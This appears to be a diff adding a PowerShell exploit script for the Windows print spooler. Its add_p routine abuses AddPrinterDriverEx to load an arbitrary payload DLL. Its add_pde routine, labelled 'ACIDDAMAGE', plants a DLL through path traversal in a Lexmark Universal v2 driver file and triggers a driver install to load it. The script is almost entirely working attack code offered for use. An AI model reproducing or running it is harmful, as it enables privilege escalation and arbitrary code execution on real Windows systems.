@@ -1,0 +1,523 @@
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class WinSpool
+{
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+    public struct DRIVER_INFO_2 {
+        public uint cVersion;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pName;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pEnvironment;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pDriverPath;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pDataFile;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pConfigFile;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+    public struct PRINTER_INFO_2
+    {
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pServerName;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pPrinterName;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pShareName;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pPortName;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pDriverName;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pComment;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pLocation;
+        public IntPtr pDevMode;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pSepFile;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pPrintProcessor;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pDatatype;
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public string pParameters;
+        public IntPtr pSecurityDescriptor;
+        public uint Attributes; // See note below!
+        public uint Priority;
+        public uint DefaultPriority;
+        public uint StartTime;
+        public uint UntilTime;
+        public uint Status;
+        public uint cJobs;
+        public uint AveragePPM;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
+    public struct PRINTER_DEFAULTS {
+        [MarshalAs(UnmanagedType.LPTStr)]
+        public String pDatatype;
+        public IntPtr pDevMode;
+        public uint DesiredAccess;
+    }
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool EnumPrinterDrivers(String pName, String pEnvironment, uint level, IntPtr pDriverInfo, uint cdBuf, ref uint pcbNeeded, ref uint pcReturned);
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool AddPrinterDriverEx(String pName, uint level, IntPtr pDriverInfo, uint dwFileCopyFlags);
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool DeletePrinterDriverEx(String pName, String pEnvironment, String pDriverName, uint dwDeleteFlags, uint dwVersionFlag);
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern IntPtr AddPrinter(String pName, uint level, IntPtr pPrinter);
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool DeletePrinter(IntPtr hPrinter);
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool OpenPrinter(String pPrinterName, ref IntPtr phPrinter, IntPtr pDefault);
+
+    [DllImport("winspool.drv", CharSet = CharSet.Auto, SetLastError = true)]
+    public static extern bool ClosePrinter(IntPtr hPrinter);
+}
+"@
+
+function add_p {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory=$true)]
+        [ValidateScript({ [System.IO.Path]::IsPathRooted($_) })]
+        [String] $DllPath
+    )
+    
+    begin {
+        $NewDriverName = [Guid]::NewGuid()
+        $NewDriverDllPath = $null
+        $NewDriverCreated = $false
+    }
+    
+    process {
+        Write-Output "[*] Enumerating printer drivers..."
+
+        $DriverList = [object[]] (Get-WinSpoolPrinterDriver -ErrorVariable LastError -ErrorAction SilentlyContinue)
+
+        if ($null -eq $DriverList) { if ($LastError) { Write-Output "[-] $($LastError)" } else { Write-Output "[-] Failed to enumerate printer drivers." }; return }
+
+        Write-Output "[*] Found $($DriverList.Count) printer drivers."
+
+        # For DLLs that are not in '%windir%\System32\DriverStore\FileRepository',
+        # AddPrinterDriver seems to always fail with the error "The process cannot
+        # access the file because it is being used by another process)", so we need
+        # to filter out those drivers.
+        $DriverList = [object[]] ($DriverList | Where-Object { $_.pDriverPath -like "*FileRepository*" })
+        Write-Output "[*] Found $($DriverList.Count) suitable printer drivers."
+        $DriverIndex = Get-Random -Minimum 0 -Maximum $DriverList.Count
+        $Driver = $DriverList[$DriverIndex]
+
+        Write-Output "[*] Using random printer driver '$($Driver.pName)' as a template..."
+
+        $NewDriverInfo = New-Object WinSpool+DRIVER_INFO_2
+        $NewDriverInfo.cVersion = 3 # The operating system version for which the driver was written. The supported value is 3.
+        $NewDriverInfo.pName = $NewDriverName
+        $NewDriverInfo.pEnvironment = $Driver.pEnvironment
+        $NewDriverInfo.pDriverPath = $Driver.pDriverPath
+        $NewDriverInfo.pDataFile = $DllPath
+        $NewDriverInfo.pConfigFile = $DllPath
+
+        Write-Output "[*] Attempting to create printer driver with name '$($NewDriverInfo.pName)'..."
+
+        $NewDriverCreated = Add-WinSpoolPrinterDriver -DriverInfo $NewDriverInfo -ErrorVariable LastError -ErrorAction SilentlyContinue
+
+        if (-not $NewDriverCreated) { if ($LastError) { Write-Output "[-] $($LastError)" } else { Write-Output "[-] Failed to create printer driver." }; return }
+
+        Write-Output "[+] AddPrinterDriver did not return any error, the DLL should have been loaded!"
+
+        $NewDriver = Get-WinSpoolPrinterDriver | Where-Object { $_.Name -eq $NewDriverName }
+        if ($null -eq $NewDriver) { Write-Output "[-] New printer driver not found, nothing to clean up."; return }
+
+        $NewDriverDllPath = $NewDriver.pDataFile
+
+        Write-Output "[*] The payload DLL was copied to: $($NewDriverDllPath)"
+    }
+    
+    end {
+        if ($NewDriverCreated) {
+            try {
+                $null = Remove-WinSpoolPrinterDriver -DriverName "$($NewDriverName)"
+            }
+            catch {
+                Write-Output "[!] Failed to delete printer driver: $($_)"
+            }
+        }
+
+        if ($null -ne $NewDriverDllPath) {
+            if (Test-Path -Path $NewDriverDllPath) {
+                Write-Output "[-] Failed to delete payload DLL."
+            }
+            else {
+                Write-Output "[*] The payload DLL was successfully deleted."
+            }
+        }
+    }
+}
+
+function add_pde {
+    [CmdletBinding()]
+    param (
+        [ValidateSet("Lexmark Universal v2")]
+        [string] $DriverName = "Lexmark Universal v2",
+        [Parameter(Mandatory=$true)]
+        [ValidateScript({ [System.IO.File]::Exists($_) })]
+        [string] $DllPath
+    )
+    
+    begin {
+        $PRINTER_ATTRIBUTE_RAW_ONLY = 0x00001000
+        $PRINTER_ATTRIBUTE_HIDDEN   = 0x00000020
+
+        switch ($DriverName) {
+            "Lexmark Universal v2" {
+                $TargetDirectory = Join-Path -Path $env:ProgramData -ChildPath "$($DriverName)"
+                $TargetFile = "Universal Color Laser.gdl"
+                $ExploitName = "ACIDDAMAGE"
+            }
+        }
+
+        function TriggerPrinterDriverInstall {
+            param (
+                [string] $DriverName,
+                [string] $ExploitName
+            )
+
+            $PrinterInfo = New-Object WinSpool+PRINTER_INFO_2
+            $PrinterInfo.pPortName = "LPT1:"
+            $PrinterInfo.pDriverName = $DriverName
+            $PrinterInfo.pPrinterName = $ExploitName
+            $PrinterInfo.pPrintProcessor = "WinPrint"
+            $PrinterInfo.pDataType = "RAW"
+            $PrinterInfo.Attributes = $PRINTER_ATTRIBUTE_RAW_ONLY + $PRINTER_ATTRIBUTE_HIDDEN
+
+            Write-Output "[*] Creating a printer to trigger driver install..."
+
+            try { $PrinterHandle = Add-WinSpoolPrinter -PrinterInfo $PrinterInfo }
+            catch { Write-Verbose $_ }
+
+            if ($PrinterHandle -eq [IntPtr]::Zero) { Write-Output "[-] Failed to create printer."; return $false }
+
+            Write-Output "[+] Printer created."
+
+            try { $Success = Remove-WinSpoolPrinter -PrinterHandle $PrinterHandle }
+            catch { Write-Verbose $_ }
+
+            if (-not $Success) { Write-Output "[!] Failed to delete printer." }
+
+            try { $Success = Close-WinSpoolPrinter -PrinterHandle $PrinterHandle }
+            catch { Write-Verbose $_ }
+
+            if (-not $Success) { Write-Output "[!] Failed to close printer." }
+
+            return $true
+        }
+    }
+    
+    process {
+        if ($DriverName -eq "Lexmark Universal v2") {
+
+            if (-not [System.IO.Directory]::Exists($TargetDirectory)) {
+                Write-Output "[*] Target directory does not exist: $($TargetDirectory)"
+
+                if (-not (TriggerPrinterDriverInstall -DriverName $DriverName -ExploitName $ExploitName)) {
+                    return
+                }
+
+                if (-not [System.IO.Directory]::Exists($TargetDirectory)) {
+                    Write-Output "[-] Target directory still does not exist. Exiting..."
+                    return
+                }
+                else {
+                    Write-Output "[+] Target directory exists. Continuing..."
+                }
+            }
+
+            $Guid = [Guid]::NewGuid().Guid
+            $StringMatch = "<GDL_ATTRIBUTE Name=`"*Name`" xsi:type=`"GDLW_string`">LMUD1OUE.DLL</GDL_ATTRIBUTE>"
+            $StringReplace = "<GDL_ATTRIBUTE Name=`"*Name`" xsi:type=`"GDLW_string`">..\..\..\..\..\..\$($Guid)\LMUD1OUE.DLL</GDL_ATTRIBUTE>"
+
+            $TargetFilePath = Join-Path -Path $TargetDirectory -ChildPath $TargetFile
+            Write-Output "[*] Reading target file: $($TargetFilePath)"
+            $TargetFileContent = Get-Content -Path $TargetFilePath
+
+            Write-Output "[*] Modifying target file..."
+            $TargetFileContent = $TargetFileContent.Replace($StringMatch, $StringReplace)
+            try { $TargetFileContent | Out-File -FilePath $TargetFilePath -Encoding ascii -Force }
+            catch { Write-Output "[-] Failed to write target file content. Error: $($_)"; return }
+
+            $TempDirectoryPath = "$($env:SystemDrive)\$($Guid)"
+            Write-Output "[*] Creating temp directory '$($TempDirectoryPath)'..."
+            $null = New-Item -Path $TempDirectoryPath -ItemType Directory -Force -ErrorAction SilentlyContinue -ErrorVariable NewItemError
+            if ($NewItemError) {
+                Write-Output "[-] Failed to create temp directory. Error: $($NewItemError)"
+                return
+            }
+
+            $TargetDllPath = Join-Path -Path $TempDirectoryPath -ChildPath "LMUD1OUE.dll"
+            Write-Output "[*] Copying DLL to '$($TargetDllPath)'..."
+            $null = Copy-Item -Path $DllPath -Destination $TargetDllPath -Force -ErrorAction SilentlyContinue -ErrorVariable CopyItemError
+            if ($CopyItemError) {
+                Write-Output "[-] Failed to copy DLL to temp directory. Error: $($CopyItemError)"
+                return
+            }
+
+            Write-Output "[*] Triggering driver install again to load custom DLL..."
+            $null = TriggerPrinterDriverInstall -DriverName $DriverName -ExploitName $ExploitName
+
+            Write-Output "[*] Printer driver installation triggered, the DLL should have been loaded."
+
+            Remove-Item -Path $TargetDirectory -Recurse -Force
+            Remove-Item -Path $TempDirectoryPath -Recurse -Force
+        }
+        else {
+            throw "Exploit for '$($DriverName)' not implemented."
+        }
+    }
+}
+
+function Get-WinSpoolPrinterDriver {
+    <#
+    .SYNOPSIS
+    Enumerate installed printer drivers.
+    
+    .EXAMPLE
+    C:\> Get-WinSpoolPrinterDriver
+
+    pName        : Universal Print Class Driver
+    pEnvironment : Windows x64
+    pDriverPath  : C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c9c90c6b723b165b\Amd64\mxdwdrv.dll
+    pDataFile    : C:\WINDOWS\System32\DriverStore\FileRepository\prnms014.inf_amd64_b02bbec129278b6e\MSMPS.xml
+    pConfigFile  : C:\WINDOWS\System32\DriverStore\FileRepository\prnms003.inf_amd64_e0b5a96a87cd7f72\Amd64\PrintConfig.dll
+
+    pName        : Microsoft Virtual Print Class Driver
+    pEnvironment : Windows x64
+    pDriverPath  : C:\WINDOWS\System32\DriverStore\FileRepository\ntprint4.inf_amd64_1d1ba0adaf8eaf8c\Amd64\msdwdrv.dll
+    pDataFile    : C:\WINDOWS\System32\DriverStore\FileRepository\prnms015.inf_amd64_d4976649e33fd626\MSVPD-PDC.xml
+    pConfigFile  : C:\WINDOWS\System32\DriverStore\FileRepository\prnms003.inf_amd64_e0b5a96a87cd7f72\Amd64\PrintConfig.dll
+
+    pName        : Microsoft Print To PDF
+    pEnvironment : Windows x64
+    pDriverPath  : C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c9c90c6b723b165b\Amd64\mxdwdrv.dll
+    pDataFile    : C:\WINDOWS\System32\DriverStore\FileRepository\prnms009.inf_amd64_5555b7fbfa8487e2\MPDW-PDC.xml
+    pConfigFile  : C:\WINDOWS\System32\DriverStore\FileRepository\prnms003.inf_amd64_e0b5a96a87cd7f72\Amd64\PrintConfig.dll
+
+    pName        : Microsoft IPP Class Driver
+    pEnvironment : Windows x64
+    pDriverPath  : C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_c9c90c6b723b165b\Amd64\mxdwdrv.dll
+    pDataFile    : C:\WINDOWS\System32\DriverStore\FileRepository\prnms012.inf_amd64_17bb82cc430e1f2e\MSIPP.xml
+    pConfigFile  : C:\WINDOWS\System32\DriverStore\FileRepository\prnms003.inf_amd64_e0b5a96a87cd7f72\Amd64\PrintConfig.dll
+
+    pName        : Microsoft enhanced Point and Print compatibility driver
+    pEnvironment : Windows x64
+    pDriverPath  : C:\WINDOWS\system32\spool\DRIVERS\x64\3\mxdwdrv.dll
+    pDataFile    : C:\WINDOWS\system32\spool\DRIVERS\x64\3\unishare.gpd
+    pConfigFile  : C:\WINDOWS\system32\spool\DRIVERS\x64\3\PrintConfig.dll
+    #>
+    [OutputType([object[]])]
+    [CmdletBinding()]
+    param ()
+    
+    begin {
+        $Environment = "Windows x64"
+        $InfoLevel = 2
+        $BufferPtr = [IntPtr]::Zero
+        $DriverInfoType = (New-Object WinSpool+DRIVER_INFO_2).GetType()
+    }
+    
+    process {
+        [UInt32] $BytesNeeded = 0
+        [UInt32] $Count = 0
+        $null = [WinSpool]::EnumPrinterDrivers($null, $Environment, $InfoLevel, [IntPtr]::Zero, 0, [ref] $BytesNeeded, [ref] $Count)
+        if ($BytesNeeded -eq 0) {
+            throw "EnumPrinterDrivers failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        Write-Verbose "EnumPrinterDrivers OK - BytesNeeded: $($BytesNeeded)"
+
+        $BufferPtr = [IntPtr] [Runtime.InteropServices.Marshal]::AllocHGlobal($BytesNeeded)
+
+        $Success = [WinSpool]::EnumPrinterDrivers($null, $Environment, $InfoLevel, $BufferPtr, $BytesNeeded, [ref] $BytesNeeded, [ref] $Count)
+        if (-not $Success) {
+            throw "EnumPrinterDrivers failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        Write-Verbose "EnumPrinterDrivers OK - Count: $($Count)"
+
+        $CurrentEntryPtr = $BufferPtr
+        for ($i = 0; $i -lt $Count; $i++) {
+            $DriverEntry = [Runtime.InteropServices.Marshal]::PtrToStructure($CurrentEntryPtr, [type] $DriverInfoType)
+            $Offset = [Runtime.InteropServices.Marshal]::SizeOf([type] $DriverInfoType)
+            $CurrentEntryPtr = [IntPtr] ($CurrentEntryPtr.ToInt64() + $Offset)
+            Write-Verbose "Driver entry $($i): $($DriverEntry.pName)"
+            $DriverEntry
+        }
+    }
+    
+    end {
+        if ($BufferPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($BufferPtr); $BufferPtr = [IntPtr]::Zero}
+    }
+}
+
+function Add-WinSpoolPrinterDriver {
+    [OutputType([Bool])]
+    [CmdletBinding()]
+    param (
+        [object] $DriverInfo
+    )
+    
+    begin {
+        $InfoLevel = 2
+        
+        $DriverInfoPtr = [IntPtr]::Zero
+    }
+    
+    process {
+        $DriverInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($DriverInfo))
+        [System.Runtime.InteropServices.Marshal]::StructureToPtr($DriverInfo, $DriverInfoPtr, $false)
+
+        $FileCopyFlags = [UInt32] 0
+        $FileCopyFlags += 0x00000004 # APD_COPY_ALL_FILES
+        $FileCopyFlags += 0x00000010 # APD_COPY_FROM_DIRECTORY
+        $FileCopyFlags += 0x00008000 # APD_INSTALL_WARNED_DRIVER
+
+        $Success = [WinSpool]::AddPrinterDriverEx($null, $InfoLevel, $DriverInfoPtr, $FileCopyFlags)
+        if (-not $Success) {
+            throw "AddPrinterDriverEx failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        return $Success
+    }
+    
+    end {
+        if ($DriverInfoPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($DriverInfoPtr); $DriverInfoPtr = [IntPtr]::Zero}
+    }
+}
+
+function Remove-WinSpoolPrinterDriver {
+    [OutputType([Bool])]
+    [CmdletBinding()]
+    param (
+        [string] $DriverName
+    )
+    
+    begin {
+        $Environment = "Windows x64"
+    }
+    
+    process {
+        $DeleteFlags = [UInt32] 0
+        $DeleteFlags += 0x00000001 # DPD_DELETE_UNUSED_FILES
+
+        $Success = [WinSpool]::DeletePrinterDriverEx($null, $Environment, $DriverName, $DeleteFlags, 0)
+        if (-not $Success) {
+            throw "DeletePrinterDriverEx failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+        
+        return $Success
+    }
+}
+
+function Add-WinSpoolPrinter {
+    [OutputType([IntPtr])]
+    [CmdletBinding()]
+    param (
+        [object] $PrinterInfo
+    )
+    
+    begin {
+        $PrinterInfoPtr = [IntPtr]::Zero
+    }
+    
+    process {
+        $PrinterInfoPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($PrinterInfo))
+        [System.Runtime.InteropServices.Marshal]::StructureToPtr($PrinterInfo, $PrinterInfoPtr, $false)
+
+        $PrinterHandle = [WinSpool]::AddPrinter($null, 2, $PrinterInfoPtr)
+        if (($null -eq $PrinterHandle) -or ($PrinterHandle -eq [IntPtr]::Zero)) {
+            throw "AddPrinter failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        return $PrinterHandle
+    }
+    
+    end {
+        if ($PrinterInfoPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($PrinterInfoPtr); $PrinterInfoPtr = [IntPtr]::Zero }
+    }
+}
+
+function Get-WinSpoolPrinter {
+    [OutputType([IntPtr])]
+    [CmdletBinding()]
+    param (
+        [String] $Name
+    )
+
+    begin {
+        $PrinterDefaultsPtr = [IntPtr]::Zero
+    }
+    
+    process {
+        $PrinterDefaults = New-Object WinSpool+PRINTER_DEFAULTS
+        $PrinterDefaults.DesiredAccess = 0x000f000c # PRINTER_ALL_ACCESS
+
+        $PrinterDefaultsPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($PrinterDefaults))
+        [System.Runtime.InteropServices.Marshal]::StructureToPtr($PrinterDefaults, $PrinterDefaultsPtr, $false)
+
+        $PrinterHandle = [IntPtr]::Zero
+        $Success = [WinSpool]::OpenPrinter($Name, [ref] $PrinterHandle, $PrinterDefaultsPtr)
+        if (-not $Success) {
+            throw "OpenPrinter failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        return $PrinterHandle
+    }
+
+    end {
+        if ($PrinterDefaultsPtr -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::FreeHGlobal($PrinterDefaultsPtr); $PrinterDefaultsPtr = [IntPtr]::Zero }
+    }
+}
+
+function Remove-WinSpoolPrinter {
+    [OutputType([Bool])]
+    [CmdletBinding()]
+    param (
+        [IntPtr] $PrinterHandle
+    )
+    
+    process {
+        $Success = [WinSpool]::DeletePrinter($PrinterHandle)
+        if (-not $Success) {
+            throw "DeletePrinter failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        return $Success
+    }
+}
+
+function Close-WinSpoolPrinter {
+    [OutputType([Bool])]
+    [CmdletBinding()]
+    param (
+        [IntPtr] $PrinterHandle
+    )
+    
+    process {
+        $Success = [WinSpool]::ClosePrinter($PrinterHandle)
+        if (-not $Success) {
+            throw "ClosePrinter failed with error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        }
+
+        return $Success
+    }
+}
